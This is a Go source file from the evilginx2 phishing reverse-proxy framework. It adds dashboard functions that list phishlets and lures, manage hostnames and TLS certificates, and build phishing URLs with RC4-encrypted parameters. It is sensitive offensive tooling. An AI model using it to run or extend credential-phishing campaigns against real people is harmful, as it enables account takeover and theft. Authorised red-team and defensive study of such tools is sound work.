package core

import (
	"crypto/rc4"
	"encoding/base64"
	"fmt"
	"math/rand"
	"net/url"
	"sort"
	"strings"
	"time"

	"github.com/kgretzky/evilginx2/log"
)

// This file exposes a small, read-only surface of the evilginx core state for
// the embedded reporting dashboard (see the top-level `dashboard` package).
//
// It lives in package `core` so it can read unexported fields directly without
// creating an import cycle (dashboard imports core, never the reverse). Nothing
// here mutates state; all mutations go through the existing public Config API
// (AddLure/SetLure/DeleteLure, SetSiteEnabled/SetSiteDisabled, etc.).

// String renders a phishlet version as "major.minor.build".
func (v PhishletVersion) String() string {
	return fmt.Sprintf("%d.%d.%d", v.major, v.minor, v.build)
}

// IsTemplate reports whether the phishlet is a template (cannot be enabled
// directly; a child must be created from it first).
func (p *Phishlet) IsTemplate() bool {
	return p.isTemplate
}

// FilePath returns the path to the phishlet's source YAML file.
func (p *Phishlet) FilePath() string {
	return p.Path
}

// ManageCertificates provisions/refreshes TLS certificates for all currently
// active phishlet hostnames. This is the same work the interactive terminal does
// after enabling/disabling a phishlet, factored out so the dashboard can apply
// changes live without an engine restart. Safe to call repeatedly.
func (p *HttpProxy) ManageCertificates(verbose bool) error {
	if p.developer {
		return nil
	}
	if p.cfg.IsAutocertEnabled() {
		hosts := p.cfg.GetActiveHostnames("")
		if verbose {
			log.Info("obtaining and setting up %d TLS certificates - please wait up to 60 seconds...", len(hosts))
		}
		if err := p.crt_db.setManagedSync(hosts, 60*time.Second); err != nil {
			return err
		}
		if verbose {
			log.Info("successfully set up all TLS certificates")
		}
		return nil
	}
	return p.crt_db.setUnmanagedSync(verbose)
}

// SetPhishletHostname sets a phishlet's phishing hostname, returning a
// descriptive error on failure (unlike the terminal's bool-returning
// SetSiteHostname). The hostname must be the base domain or a subdomain of it.
func (c *Config) SetPhishletHostname(site string, hostname string) error {
	if c.general.Domain == "" {
		return fmt.Errorf("server base domain is not set")
	}
	pl, err := c.GetPhishlet(site)
	if err != nil {
		return err
	}
	if pl.isTemplate {
		return fmt.Errorf("phishlet '%s' is a template - can't set hostname", site)
	}
	if hostname != "" && hostname != c.general.Domain && !strings.HasSuffix(hostname, "."+c.general.Domain) {
		return fmt.Errorf("phishlet hostname must be '%s' or end with '.%s'", c.general.Domain, c.general.Domain)
	}
	c.PhishletConfig(site).Hostname = hostname
	c.SavePhishlets()
	return nil
}

// RemovePhishlet unregisters a phishlet. A child phishlet is removed from the
// subphishlet config; a regular phishlet is disabled and unregistered (the
// caller is responsible for deleting its backing YAML file). It refuses to
// remove a phishlet that still has child phishlets derived from it.
func (c *Config) RemovePhishlet(name string) error {
	pl, err := c.GetPhishlet(name)
	if err != nil {
		return err
	}
	for childName, child := range c.phishlets {
		if childName != name && child.ParentName == name {
			return fmt.Errorf("phishlet '%s' has child phishlet '%s' - delete the child first", name, childName)
		}
	}
	if pl.ParentName != "" {
		return c.DeleteSubPhishlet(name)
	}
	c.SetSiteDisabled(name)
	c.phishletNames = removeString(name, c.phishletNames)
	delete(c.phishlets, name)
	delete(c.phishletConfig, name)
	c.refreshActiveHostnames()
	c.SavePhishlets()
	return nil
}

// ImportPhishlet loads (or reloads) a phishlet definition from a YAML file on
// disk and registers it with the config, replacing any existing phishlet of the
// same name. The phishlet's enabled/hostname state (kept in phishletConfig) is
// preserved across a reload. Returns an error if the YAML is invalid.
func (c *Config) ImportPhishlet(name string, path string) error {
	pl, err := NewPhishlet(name, path, nil, c)
	if err != nil {
		return err
	}
	if _, exists := c.phishlets[name]; !exists {
		c.phishletNames = append(c.phishletNames, name)
	}
	c.phishlets[name] = pl
	c.refreshActiveHostnames()
	c.VerifyPhishlets()
	return nil
}

// LureInfo is a flat, JSON-friendly view of a single lure plus its derived
// phishing URL and runtime state.
type LureInfo struct {
	Index         int    `json:"index"`
	Id            string `json:"id"`
	Phishlet      string `json:"phishlet"`
	Hostname      string `json:"hostname"`
	Path          string `json:"path"`
	RedirectUrl   string `json:"redirect_url"`
	Redirector    string `json:"redirector"`
	UaFilter      string `json:"ua_filter"`
	Info          string `json:"info"`
	OgTitle       string `json:"og_title"`
	OgDescription string `json:"og_desc"`
	OgImageUrl    string `json:"og_image"`
	OgUrl         string `json:"og_url"`
	PausedUntil   int64  `json:"paused_until"`
	Paused        bool   `json:"paused"`
	Url           string `json:"url"`
	Enabled       bool   `json:"enabled"` // whether the lure's phishlet is enabled
}

// ExportLures returns a snapshot of all configured lures.
func (c *Config) ExportLures() []LureInfo {
	now := time.Now().Unix()
	out := make([]LureInfo, 0, len(c.lures))
	for i, l := range c.lures {
		li := LureInfo{
			Index:         i,
			Id:            l.Id,
			Phishlet:      l.Phishlet,
			Hostname:      l.Hostname,
			Path:          l.Path,
			RedirectUrl:   l.RedirectUrl,
			Redirector:    l.Redirector,
			UaFilter:      l.UserAgentFilter,
			Info:          l.Info,
			OgTitle:       l.OgTitle,
			OgDescription: l.OgDescription,
			OgImageUrl:    l.OgImageUrl,
			OgUrl:         l.OgUrl,
			PausedUntil:   l.PausedUntil,
			Paused:        l.PausedUntil > now,
			Enabled:       c.IsSiteEnabled(l.Phishlet),
		}
		if pl, err := c.GetPhishlet(l.Phishlet); err == nil {
			if u, err := pl.GetLureUrl(l.Path); err == nil {
				li.Url = u
			}
		}
		out = append(out, li)
	}
	return out
}

// CreatePhishUrl appends RC4-encrypted custom parameters to a base lure URL,
// exactly as the terminal's get-url does. Shared so the dashboard produces
// identical links.
func CreatePhishUrl(baseUrl string, params url.Values) string {
	ret := baseUrl
	if len(params) > 0 {
		key_arg := strings.ToLower(GenRandomString(rand.Intn(3) + 1))
		enc_key := GenRandomAlphanumString(8)
		dec_params := params.Encode()

		var crc byte
		for _, c := range dec_params {
			crc += byte(c)
		}
		c, _ := rc4.NewCipher([]byte(enc_key))
		enc_params := make([]byte, len(dec_params)+1)
		c.XORKeyStream(enc_params[1:], []byte(dec_params))
		enc_params[0] = crc

		key_val := enc_key + base64.RawURLEncoding.EncodeToString([]byte(enc_params))
		ret += "?" + key_arg + "=" + key_val
	}
	return ret
}

// GetLurePhishUrl builds the full phishing URL for a lure (by index), optionally
// with encrypted custom parameters. Requires the phishlet's hostname to be set.
func (c *Config) GetLurePhishUrl(index int, params map[string]string) (string, error) {
	l, err := c.GetLure(index)
	if err != nil {
		return "", err
	}
	pl, err := c.GetPhishlet(l.Phishlet)
	if err != nil {
		return "", err
	}
	bhost, ok := c.GetSiteDomain(pl.Name)
	if !ok || len(bhost) == 0 {
		return "", fmt.Errorf("no hostname set for phishlet '%s'", pl.Name)
	}
	var baseUrl string
	if l.Hostname != "" {
		baseUrl = "https://" + l.Hostname + l.Path
	} else {
		baseUrl, err = pl.GetLureUrl(l.Path)
		if err != nil {
			return "", err
		}
	}
	vals := url.Values{}
	for k, v := range params {
		vals.Add(k, v)
	}
	return CreatePhishUrl(baseUrl, vals), nil
}

// LureCount returns the number of configured lures.
func (c *Config) LureCount() int {
	return len(c.lures)
}

// PhishletInfo is a flat, JSON-friendly view of a phishlet's metadata and state.
type PhishletInfo struct {
	Name       string            `json:"name"`
	ParentName string            `json:"parent_name"`
	IsChild    bool              `json:"is_child"`
	Author     string            `json:"author"`
	Version    string            `json:"version"`
	Template   bool              `json:"template"`
	Enabled    bool              `json:"enabled"`
	Visible    bool              `json:"visible"`
	Hidden     bool              `json:"hidden"`
	Hostname   string            `json:"hostname"`
	UnauthUrl  string            `json:"unauth_url"`
	Hosts      []string          `json:"hosts"`
	Params     map[string]string `json:"params,omitempty"`
	Collisions []string          `json:"collisions,omitempty"` // other enabled phishlets sharing a host
}

// PhishletCollisions returns, for each enabled phishlet, the names of other
// enabled phishlets it shares at least one phishing host with. Two enabled
// phishlets claiming the same host cannot both serve correctly; everything else
// (distinct hosts) coexists fine.
func (c *Config) PhishletCollisions() map[string][]string {
	owners := map[string][]string{}
	for _, name := range c.phishletNames {
		pl, err := c.GetPhishlet(name)
		if err != nil || pl.isTemplate || !c.IsSiteEnabled(name) {
			continue
		}
		for _, h := range pl.GetPhishHosts(false) {
			h = strings.ToLower(h)
			owners[h] = append(owners[h], name)
		}
	}
	sets := map[string]map[string]bool{}
	for _, names := range owners {
		if len(names) < 2 {
			continue
		}
		for _, a := range names {
			for _, b := range names {
				if a == b {
					continue
				}
				if sets[a] == nil {
					sets[a] = map[string]bool{}
				}
				sets[a][b] = true
			}
		}
	}
	out := map[string][]string{}
	for name, set := range sets {
		list := make([]string, 0, len(set))
		for n := range set {
			list = append(list, n)
		}
		sort.Strings(list)
		out[name] = list
	}
	return out
}

// ExportPhishlets returns a snapshot of all loaded phishlets and their state.
func (c *Config) ExportPhishlets() []PhishletInfo {
	collisions := c.PhishletCollisions()
	out := make([]PhishletInfo, 0, len(c.phishletNames))
	for _, name := range c.phishletNames {
		pl, err := c.GetPhishlet(name)
		if err != nil {
			continue
		}
		pc := c.PhishletConfig(name)
		var hosts []string
		if !pl.isTemplate {
			hosts = pl.GetPhishHosts(false)
		}
		info := PhishletInfo{
			Name:       pl.Name,
			ParentName: pl.ParentName,
			IsChild:    pl.ParentName != "",
			Author:     pl.Author,
			Version:    pl.Version.String(),
			Template:   pl.isTemplate,
			Enabled:    pc.Enabled,
			Visible:    pc.Visible,
			Hidden:     !pc.Visible,
			Hostname:   pc.Hostname,
			UnauthUrl:  pc.UnauthUrl,
			Hosts:      hosts,
		}
		if len(pl.customParams) > 0 {
			info.Params = pl.customParams
		}
		if cols, ok := collisions[name]; ok {
			info.Collisions = cols
		}
		out = append(out, info)
	}
	return out
}

// PhishletHosts returns the "<external-ip> <host>" lines for a phishlet, matching
// the terminal's `phishlets get-hosts` output. Requires the phishlet's hostname
// (and server external IP) to be set.
func (c *Config) PhishletHosts(site string) (ip string, hosts []string, err error) {
	pl, err := c.GetPhishlet(site)
	if err != nil {
		return "", nil, err
	}
	host, ok := c.GetSiteDomain(pl.Name)
	if !ok || len(host) == 0 {
		return "", nil, fmt.Errorf("no hostname set for phishlet '%s'", pl.Name)
	}
	return c.GetServerExternalIP(), pl.GetPhishHosts(false), nil
}

// GeneralInfo is a flat, JSON-friendly view of the server configuration.
type GeneralInfo struct {
	Domain       string `json:"domain"`
	ExternalIpv4 string `json:"external_ipv4"`
	BindIpv4     string `json:"bind_ipv4"`
	UnauthUrl    string `json:"unauth_url"`
	HttpsPort    int    `json:"https_port"`
	DnsPort      int    `json:"dns_port"`
	Autocert     bool   `json:"autocert"`
}

// ExportGeneral returns the general server configuration.
func (c *Config) ExportGeneral() GeneralInfo {
	return GeneralInfo{
		Domain:       c.general.Domain,
		ExternalIpv4: c.general.ExternalIpv4,
		BindIpv4:     c.general.BindIpv4,
		UnauthUrl:    c.general.UnauthUrl,
		HttpsPort:    c.general.HttpsPort,
		DnsPort:      c.general.DnsPort,
		Autocert:     c.general.Autocert,
	}
}

// BlacklistInfo is a JSON-friendly view of the blacklist configuration.
type BlacklistInfo struct {
	Mode string `json:"mode"`
}

// ProxyInfo is a JSON-friendly view of the upstream proxy configuration.
type ProxyInfo struct {
	Enabled  bool   `json:"enabled"`
	Type     string `json:"type"`
	Address  string `json:"address"`
	Port     int    `json:"port"`
	Username string `json:"username"`
	Password string `json:"password"`
}

// GoPhishInfo is a JSON-friendly view of the GoPhish integration configuration.
type GoPhishInfo struct {
	AdminUrl    string `json:"admin_url"`
	ApiKey      string `json:"api_key"`
	InsecureTLS bool   `json:"insecure_tls"`
}

// SettingsInfo is the full, comprehensive server configuration exposed to the
// dashboard, plus the allowed enum values for select inputs.
type SettingsInfo struct {
	General        GeneralInfo   `json:"general"`
	Blacklist      BlacklistInfo `json:"blacklist"`
	Proxy          ProxyInfo     `json:"proxy"`
	GoPhish        GoPhishInfo   `json:"gophish"`
	BlacklistModes []string      `json:"blacklist_modes"`
	ProxyTypes     []string      `json:"proxy_types"`
}

// ProxyTypes are the upstream proxy types evilginx supports.
var ProxyTypes = []string{"http", "https", "socks5", "socks5h"}

// ExportSettings returns the complete server configuration.
func (c *Config) ExportSettings() SettingsInfo {
	return SettingsInfo{
		General: c.ExportGeneral(),
		Blacklist: BlacklistInfo{
			Mode: c.blacklistConfig.Mode,
		},
		Proxy: ProxyInfo{
			Enabled:  c.proxyConfig.Enabled,
			Type:     c.proxyConfig.Type,
			Address:  c.proxyConfig.Address,
			Port:     c.proxyConfig.Port,
			Username: c.proxyConfig.Username,
			Password: c.proxyConfig.Password,
		},
		GoPhish: GoPhishInfo{
			AdminUrl:    c.gophishConfig.AdminUrl,
			ApiKey:      c.gophishConfig.ApiKey,
			InsecureTLS: c.gophishConfig.InsecureTLS,
		},
		BlacklistModes: BLACKLIST_MODES,
		ProxyTypes:     ProxyTypes,
	}
}

// ApplyProxyConfig writes the upstream proxy configuration atomically. It exists
// because the terminal's per-field SetProxyPort writes the wrong value to the
// config section; this sets the whole struct in one write.
func (c *Config) ApplyProxyConfig(p ProxyInfo) error {
	if p.Type != "" && !stringExists(p.Type, ProxyTypes) {
		return fmt.Errorf("invalid proxy type '%s'", p.Type)
	}
	c.proxyConfig.Enabled = p.Enabled
	c.proxyConfig.Type = p.Type
	c.proxyConfig.Address = p.Address
	c.proxyConfig.Port = p.Port
	c.proxyConfig.Username = p.Username
	c.proxyConfig.Password = p.Password
	c.cfg.Set(CFG_PROXY, c.proxyConfig)
	c.cfg.WriteConfig()
	return nil
}
